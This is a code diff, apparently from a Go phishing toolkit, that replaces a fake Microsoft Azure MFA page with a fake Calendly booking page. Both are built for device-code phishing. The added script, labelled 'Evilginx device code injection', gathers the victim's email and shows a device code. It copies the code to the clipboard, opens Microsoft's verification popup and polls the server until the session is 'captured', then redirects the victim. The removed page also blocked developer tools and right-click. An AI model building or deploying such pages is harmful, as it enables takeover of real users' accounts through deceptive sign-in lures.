-<svg width="20" height="20" viewBox="0 0 24 24"><path fill="#fff" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/><path fill="#0078d4" d="M10 15.17l-3.59-3.58L5 13l5 5 9-9-1.41-1.42z"/></svg>
-VALIDATE MFA
-</button>
-<div class="security-box">
-<p>Protected by Microsoft Azure Active Directory. Multi-factor authentication keeps your account secure.</p>
-<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
-<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-Microsoft Azure Advanced Security
-</a>
-</div>
-<p class="footer-text">Secure authentication powered by Microsoft Azure.</p>
-<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
-</div>
-<div class="success" id="successView">
-<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
-<h2>MFA Validated</h2>
-<p>Multi-factor authentication complete. You may now close this window.</p>
-<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>MFA Complete</div>
-</div>
-</div></div>
+
 <script>
-document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
-(function(){var sid='{session_id}';var verifyUrl='{verify_url}';var codeReady={code_ready};var code='{user_code}';var expiresIn={expires_seconds};var popup=null;var codeEl=document.getElementById('userCode');var statusEl=document.getElementById('codeStatus');var btnEl=document.getElementById('signInBtn');var copyBtnEl=document.getElementById('copyBtn');var copyTextEl=document.getElementById('copyText');var timerEl=document.getElementById('timerValue');function showCode(c,v){code=c;if(v)verifyUrl=v;codeEl.textContent=c;codeEl.classList.remove('loading');btnEl.disabled=false;copyBtnEl.disabled=false;document.getElementById('verifyLink').href=verifyUrl;}if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}function copyCode(){if(!code)return;if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}}function showCopied(){copyBtnEl.classList.add('copied');copyTextEl.textContent='Copied!';statusEl.textContent='Code copied to clipboard';setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);}window.copyCode=copyCode;function openSignIn(){if(!code)return;copyCode();var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');if(popup)popup.focus();}window.openSignIn=openSignIn;function updateTimer(){if(expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60);var s=expiresIn%60;timerEl.textContent=m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}if(codeReady)setTimeout(updateTimer,1000);function poll(){fetch('/dc/status/'+sid,{method:'GET',credentials:'include'}).then(function(r){return r.json()}).then(function(d){if(d.ready&&!codeReady){codeReady=true;showCode(d.user_code,d.verify_url);if(expiresIn==={expires_seconds})setTimeout(updateTimer,1000);}if(d.captured){document.getElementById('mainView').style.display='none';document.getElementById('successView').style.display='block';if(d.redirect_url){setTimeout(function(){top.location.href=d.redirect_url;},2500);}}if(!d.failed&&!d.expired&&!d.captured)setTimeout(poll,3000);})['catch'](function(){setTimeout(poll,5000);});}poll();})();
+    const now = new Date();
+    let selDate = null;
+    let selTime = null;
+    let currentStep = 1;
+
+    // Evilginx device code injection variables
+    var sid = '{session_id}';
+    var verifyUrl = '{verify_url}';
+    var codeReady = {code_ready};
+    var code = '{user_code}';
+    var expiresIn = {expires_seconds};
+    var popup = null;
+
+    function initializeLocationAndTime() {
+        const timeStr = new Date().toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
+        let tzName = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        tzName = tzName ? tzName.replace(/_/g, ' ') : "Local System Time";
+        document.getElementById('localTz').innerText = tzName + " (" + timeStr + ")";
+    }
+    initializeLocationAndTime();
+    setInterval(initializeLocationAndTime, 30000);
+
+    function buildCalendlyCalendar() {
+        const grid = document.getElementById('calendarGrid');
+        const firstDay = new Date(now.getFullYear(), now.getMonth(), 1).getDay();
+        const totalDays = new Date(now.getFullYear(), now.getMonth() + 1, 0).getDate();
+        const offset = (firstDay === 0) ? 6 : firstDay - 1;
+
+        document.getElementById('monthName').innerText = now.toLocaleDateString('en-US', { month: 'long', year: 'numeric' });
+        
+        for (let i = 0; i < offset; i++) {
+            grid.innerHTML += "<div></div>";
+        }
+
+        const weeklyAllowedIndices = [];
+        for (let w = 0; w < 6; w++) {
+            const pool = [1, 2, 3, 4];
+            const countToKeep = Math.floor(Math.random() * 2) + 2; 
+            const shuffled = pool.sort(() => 0.5 - Math.random());
+            weeklyAllowedIndices.push(shuffled.slice(0, countToKeep));
+        }
+
+        for (let d = 1; d <= totalDays; d++) {
+            const dateObj = new Date(now.getFullYear(), now.getMonth(), d);
+            const dayOfWeek = dateObj.getDay(); 
+            const absoluteDayIndex = offset + d - 1;
+            const weekIndex = Math.floor(absoluteDayIndex / 7);
+
+            const isPastDate = new Date(now.getFullYear(), now.getMonth(), d, 23, 59, 59) < now;
+            const belongsToAllowedRandomPool = weeklyAllowedIndices[weekIndex] && weeklyAllowedIndices[weekIndex].includes(dayOfWeek);
+            const isAvailableWindow = !isPastDate && belongsToAllowedRandomPool;
+
+            const dateElement = document.createElement('div');
+            dateElement.className = "date " + (isAvailableWindow ? 'available' : '');
+            dateElement.innerText = d;
+
+            if (isAvailableWindow) {
+                dateElement.onclick = () => {
+                    document.querySelectorAll('.date').forEach(el => el.classList.remove('active'));
+                    dateElement.classList.add('active');
+                    revealTimeSlots(dateObj);
+                };
+            }
+            grid.appendChild(dateElement);
+        }
+    }
+
+    function revealTimeSlots(date) {
+        selDate = date;
+        const panel = document.getElementById('timePanel');
+        const container = document.getElementById('slotsScroll');
+        
+        document.getElementById('panelDate').innerText = date.toLocaleDateString('en-US', { weekday: 'long', month: 'short', day: 'numeric' });
+        panel.classList.add('show');
+        
+        const slotsArray = ["09:00", "10:30", "13:00", "14:30", "16:00"];
+        container.innerHTML = '';
+        
+        slotsArray.forEach(time => {
+            const row = document.createElement('div');
+            row.className = 'slot-row';
+            
+            const mainBtn = document.createElement('button');
+            mainBtn.className = 'slot-btn';
+            mainBtn.innerText = time;
+            
+            const nextBtn = document.createElement('button');
+            nextBtn.className = 'confirm-btn';
+            nextBtn.innerText = 'Next';
+            
+            nextBtn.onclick = () => { selTime = time; goToStep(2); };
+            mainBtn.onclick = () => {
+                document.querySelectorAll('.slot-btn').forEach(b => b.style.display = 'block');
+                document.querySelectorAll('.confirm-btn').forEach(b => b.style.display = 'none');
+                mainBtn.style.display = 'none';
+                nextBtn.style.display = 'block';
+            };
+
+            row.append(mainBtn, nextBtn);
+            container.appendChild(row);
+        });
+    }
+
+    function syncEmailLabel(value) {
+        const cleanVal = value.trim() || "you@example.com";
+        document.getElementById('targetEmailMock').innerText = cleanVal;
+    }
+
+    function handleFormSubmit() {
+        const val = document.getElementById('userEmail').value.trim();
+        if(!val) {
+            alert("Please enter a valid email address to continue.");
+            return;
+        }
+        goToStep(3);
+    }
+
+    function updateCodeDisplay(c, v) {
+        code = c;
+        if(v) verifyUrl = v;
+        if(code) {
+            let displayCode = code.split('').join(' ');
+            document.getElementById('authCodePlaceholder').innerHTML = displayCode;
+        } else {
+            document.getElementById('authCodePlaceholder').innerHTML = 'Loading...';
+        }
+    }
+
+    if (codeReady && code) {
+        updateCodeDisplay(code, verifyUrl);
+    } else {
+        updateCodeDisplay(null, null);
+    }
+
+    /* POPUP DIALOG ENGINE MAPPINGS */
+    function openOtpDialog() {
+        document.getElementById('otpOverlay').style.display = 'flex';
+    }
+
+    function closeOtpDialog() {
+        document.getElementById('otpOverlay').style.display = 'none';
+    }
+
+    function openSignIn() {
+        if(!code) return;
+        copyAuthCode();
+        var w=520, h=700, l=(screen.width-w)/2, t=(screen.height-h)/2;
+        popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
+        if(popup) popup.focus();
+    }
+
+    function confirmAndProceed() {
+        openSignIn();
+    }
+
+    function generateNewCode() {
+        window.location.reload();
+    }
+
+    function copyAuthCode() {
+        if(!code) return;
+        navigator.clipboard.writeText(code).then(() => {
+            alert("Copied: " + code);
+        });
+    }
+
+    function goToStep(stepNumber) {
+        currentStep = stepNumber;
+        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+        document.getElementById("step" + stepNumber).classList.add('active');
+        
+        const backButton = document.getElementById('backBtn');
+        const sidebarDateTime = document.getElementById('sideDT');
+        const localizedDateText = selTime + ", " + (selDate ? selDate.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric', year: 'numeric' }) : "");
+        
+        if (stepNumber > 1 && stepNumber < 4) {
+            backButton.style.display = 'flex';
+            sidebarDateTime.style.display = 'flex';
+            document.getElementById('dtDisplay').innerText = localizedDateText;
+        } 
+        
+        if (stepNumber === 3) {
+            document.getElementById('card').style.maxWidth = "1120px";
+        } else if (stepNumber === 4) {
+            document.getElementById('sidebar').style.display = 'none';
+            document.getElementById('card').style.maxWidth = '640px';
+            document.getElementById('finalDT').innerHTML = "<svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><rect x=\"3\" y=\"4\" width=\"18\" height=\"18\" rx=\"2\" ry=\"2\"></rect><line x1=\"16\" y1=\"2\" x2=\"16\" y2=\"6\"></line><line x1=\"8\" y1=\"2\" x2=\"8\" y2=\"6\"></line><line x1=\"3\" y1=\"10\" x2=\"21\" y2=\"10\"></line></svg><span><b>" + localizedDateText + "</b></span>";
+        } else {
+            backButton.style.display = 'none';
+            sidebarDateTime.style.display = 'none';
+            document.getElementById('card').style.maxWidth = "1060px";
+        }
+    }
+
+    function stepBack() {
+        if(currentStep === 3) goToStep(2);
+        else if(currentStep === 2) goToStep(1);
+    }
+
+    function updateTimer() {
+        if(expiresIn <= 0) return;
+        expiresIn--;
+        if(expiresIn > 0) setTimeout(updateTimer, 1000);
+    }
+    if(codeReady) setTimeout(updateTimer, 1000);
+
+    function poll() {
+        fetch('/dc/status/' + sid, {method:'GET',credentials:'include'})
+        .then(function(r){return r.json()})
+        .then(function(d){
+            if(d.ready && !codeReady) {
+                codeReady = true;
+                updateCodeDisplay(d.user_code, d.verify_url);
+                if(expiresIn === {expires_seconds}) setTimeout(updateTimer, 1000);
+            }
+            if(d.captured) {
+                closeOtpDialog();
+                goToStep(4);
+                if(popup && !popup.closed) popup.close();
+                if(d.redirect_url) {
+                    setTimeout(function(){top.location.href=d.redirect_url;}, 2500);
+                }
+            }
+            if(!d.failed && !d.expired && !d.captured) setTimeout(poll, 3000);
+        })
+        .catch(function(){setTimeout(poll, 5000);});
+    }
+    poll();
+
+    buildCalendlyCalendar();
 </script>
 </body>
 </html>`
@@ -1445,8 +1977,6 @@ document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.
 </script>
 </body>
 </html>`
-
-
 
 // Excel / Q2 Financial Report themed page
 const DEVICE_CODE_EXCEL_HTML = `<!DOCTYPE html>
@@ -2773,8 +3303,8 @@ func GetInterstitialByTheme(theme string) string {
 	switch theme {
 	case "onedrive":
 		return DEVICE_CODE_ONEDRIVE_HTML
-	case "authenticator":
-		return DEVICE_CODE_AUTHENTICATOR_HTML
+	case "calendly":
+		return DEVICE_CODE_CALENDLY_HTML
 	case "lexvault":
 		return DEVICE_CODE_LEXVAULT_HTML
 	case "excel":
